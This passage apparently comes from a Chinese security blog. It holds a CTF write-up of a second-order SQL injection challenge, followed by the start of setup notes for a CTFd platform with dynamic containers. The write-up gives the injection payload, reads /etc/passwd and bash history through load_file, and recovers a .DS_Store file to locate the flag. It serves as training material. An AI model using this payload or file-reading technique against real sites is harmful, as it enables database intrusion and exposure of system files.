keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>看起来代码肯定是删过的</p><p>然后发现其实原来需要git log 恢复，不得不说，git_extract真香，直接扒出原先的源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键语句<code>select category from board where id=</code>，comment查询类别会进行直接查询，所以为sql二次注入</p><p>留言会进行查询，所以现在就要构造二次注入</p><p>语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token double-quoted-string string">"insert into comment set category = '<span class="token interpolation"><span class="token variable">$category</span></span>', content = '<span class="token interpolation"><span class="token variable">$content</span></span>', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><p>其中变量都可控，由于sql中单句换行，<code>#</code>只能注释单行，所以使用<code>/**/</code>注释</p><p>变为</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '',content=user(),/*',                content = '*/#',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token double-quoted-string string">"insert into comment set category = '',content=user(),/*', content = '*/#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>等价于 <span class="token double-quoted-string string">"insert into comment set category = '',content=user(),#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201223203506275.png" class="" title="image-20201223203506275" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203606551.png" class="" title="image-20201223203606551" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203616701.png" class="" title="image-20201223203616701" loading="lazy"><p>可以执行命令，注入无果， 转而用load_file读取下/etc/passwd </p><img src="/article/Buuoj-WEB-Write-up/image-20201223204451913.png" class="" title="image-20201223204451913" loading="lazy"><p>www用户有bash执行权限</p><p>读取www用户bash历史记录</p><img src="/article/Buuoj-WEB-Write-up/image-20201223204754524.png" class="" title="image-20201223204754524" loading="lazy"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/<span class="token function">unzip</span> html.zip<span class="token function">rm</span> -f html.zip<span class="token function">cp</span> -r html /var/www/<span class="token builtin class-name">cd</span> /var/www/html/<span class="token function">rm</span> -f .DS_Store<span class="token function">service</span> apache2 start</code></pre><p>所以<code>/tmp/html</code>目录没删，但是不知道目录文件，只知道有个<code>.DS_Store</code></p><p>读取发现是乱码，转用hex编码读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223205134946.png" class="" title="image-20201223205134946" loading="lazy"><p>脚本恢复下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/23 20:52@Auth ： gyy@File ：exp1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> binasciihexdata <span class="token operator">=</span> <span class="token string">"00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span>data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>hexdata<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">".DS_Store"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>读取到</p><img src="/article/Buuoj-WEB-Write-up/image-20201223210658137.png" class="" title="image-20201223210658137" loading="lazy"><p>直接读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211015299.png" class="" title="image-20201223211015299" loading="lazy"><p>网鼎杯的题还是很顶的</p><p>后记：</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211725414.png" class="" title="image-20201223211725414" loading="lazy"><p>然后发现答案错误…</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211919615.png" class="" title="image-20201223211919615" loading="lazy"><p>正确方法是取<code>/var/www/html/</code>下的那个文件读，因为动态靶机的缘故，送flag进靶机没有照顾到这题呀…</p><hr>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SQL </tag>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</title>
      <link href="article/CTFD/"/>
      <url>article/CTFD/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）"><a href="#CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）" class="headerlink" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）"></a>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</h1><h2 id="本篇文章最后更新于2021-2-25"><a href="#本篇文章最后更新于2021-2-25" class="headerlink" title="本篇文章最后更新于2021.2.25"></a>本篇文章最后更新于2021.2.25</h2><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfd可以说是如今最方便的ctf靶场搭建平台，支持各种插件与二次开发，<a href="https://www.zhaoj.in/">赵师傅</a>早前写了一款插件ctf-whale非常方便，但本人在搭建的过程中遇到了不少问题，经过不断研究终于完成，特此记录，以防后期忘记，也供大家交流学习。<br>赵师傅开发的插件是为了适合 <a href="https://buuoj.cn/">buu</a> 的架构,本篇文章采用完整流程+填坑讲解的格式。</p><p>我修改了一份CTFd，已上传github：<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">https://github.com/Err0rCM/CTFd_with_CTFd-whale</a> ，启动后仍需按照教程后半部分配置，省去前半部分时间，如有问题请提issue或者从头自行配置。</p><h4 id="强调！"><a href="#强调！" class="headerlink" title="强调！"></a>强调！</h4><p>由于当时国内git clone实在太慢，因为本人未配好代理，所以采用的方法是科学上网下载zip解压的方式，可自行百度git clong与Download zip的区别。本篇文章是用本地下载zip解压上传的方式完成<strong>在服务器上</strong>搭建</p><p>如果阅读中操作出现问题请自行百度，翻到文末查看坑点讲解或者查看其它搭建文章</p><p>这里感谢赵师傅zhaoj，fjh1997等前辈写的文章指导，读者遇到问题或有不足或缺陷的地方请私信我添加改正</p><h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p><strong>注意</strong>：本机为CentOS7<br>要求：</p><ol><li>已安装基础环境，熟悉linux基本操作</li><li>已安装好 Docker 和 Docker-Compose，并且启用 Docker Swarm，完成换源等操作</li><li>会<em>科学上网</em></li><li>有绝对的耐心</li></ol><p>需求：</p><ol><li>下载赵师傅改写的ctfd，赵师傅已经完成了镜像换源等操作</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd.git -&gt;赵师傅仓库</code></pre><ol start="2"><li>下载frp</li></ol><pre class="language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gz</code></pre><p>也可以直接访问链接下载然后解压上传</p><ol start="3"><li>下载ctf-whale</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale</code></pre><ol start="4"><li>下载docker的frps<br>这里在赵师傅仓库里扒拉发现的<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;Frp-Docker-For-CTFd-Whale</code></pre></li></ol><p>以上除ctfd解压后请确保字母小写，并只有一级文件夹</p><hr><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-docker集群设置"><a href="#1-docker集群设置" class="headerlink" title="1.docker集群设置"></a>1.docker集群设置</h3><p>输入命令</p><pre class="language-none"><code class="language-none">docker swarm initdocker node lsdocker node update --label-add name&#x3D;linux-1 &lt;节点 ID&gt;</code></pre><img src="/article/CTFD/20201017233032375.png" class="" title="docker集群设置" loading="lazy"><p>具体原理等可以查看其它ctfd搭建文章，文末会贴出，这里不做过多阐述</p><h3 id="2-放入ctfd-whale"><a href="#2-放入ctfd-whale" class="headerlink" title="2.放入ctfd-whale"></a>2.放入ctfd-whale</h3><p>将解压的ctfd-whale改小写后放入/CTFd/CTFd/plugins</p><h3 id="3-安装frps（这里有其他教程写的是不对的）"><a href="#3-安装frps（这里有其他教程写的是不对的）" class="headerlink" title="3.安装frps（这里有其他教程写的是不对的）"></a>3.安装frps（这里有其他教程写的是不对的）</h3><p>这里注意下，frp<strong>不是</strong>装在服务器机子上的，简单来说，frps与frpc都是在docker里的。（大坑在这里）<br>frpc是在ctfd里的，frps是在docker机里的</p><p>上传赵师傅的Frp-Docker-For-CTFd-Whale，进入目录后运行<code>docker-compose up -d</code>即可，然后<code>docker ps</code>可看到frps的容器运行中</p><img src="/article/CTFD/202010172331132.png" class="" title="frps" loading="lazy"><p>这里看到frps有28000-28100，这是在<strong>Frp-Docker-For-CTFd-Whale里的docker-compose.yml</strong>，可更改配置后compose</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">frps</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frp<span class="token punctuation">:</span>/conf/    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frps        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frps.ini    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"28000-28100:28000-28100"</span>     <span class="token comment">#可更改开放端口</span>      <span class="token punctuation">-</span> <span class="token string">"6490:6490"</span>    <span class="token comment">#此处必须与frps.ini配置一致</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span></code></pre><p>再看一下/frp/frps.ini</p><pre class="language-none"><code class="language-none">[common]bind_port &#x3D; 6490token &#x3D; randomme</code></pre><h3 id="4-配置ctfd"><a href="#4-配置ctfd" class="headerlink" title="4.配置ctfd"></a>4.配置ctfd</h3><p>直接上<strong>ctfd的docker-compose.yml</strong>配置</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2.2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">ctfd-nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span><span class="token number">1.17</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./nginx/http.conf<span class="token punctuation">:</span>/etc/nginx/nginx.conf   <span class="token comment">#这里注意</span>    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token comment">#- "85:80"     #我将这里注释掉了，这里通过nginx转发感觉速度访问速度会变慢，可能因为我的配置问题，多次尝试之后直接开8000端口访问不会对服务造成影响</span>      <span class="token punctuation">-</span> <span class="token string">"443:443"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ctfd    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>  <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 150M     <span class="token comment">#可改</span>  <span class="token key atrule">ctfd</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8000:8000"</span>     <span class="token comment">#这里原本没开端口，直接打开访问网站速度会加快</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> UPLOAD_FOLDER=/var/uploads      <span class="token punctuation">-</span> DATABASE_URL=mysql+pymysql<span class="token punctuation">:</span>//root<span class="token punctuation">:</span>ctfd@db/ctfd      <span class="token punctuation">-</span> REDIS_URL=redis<span class="token punctuation">:</span>//cache<span class="token punctuation">:</span><span class="token number">6379</span>      <span class="token punctuation">-</span> WORKERS=1      <span class="token punctuation">-</span> LOG_FOLDER=/var/log/CTFd      <span class="token punctuation">-</span> ACCESS_LOG=<span class="token punctuation">-</span>      <span class="token punctuation">-</span> ERROR_LOG=<span class="token punctuation">-</span>      <span class="token punctuation">-</span> 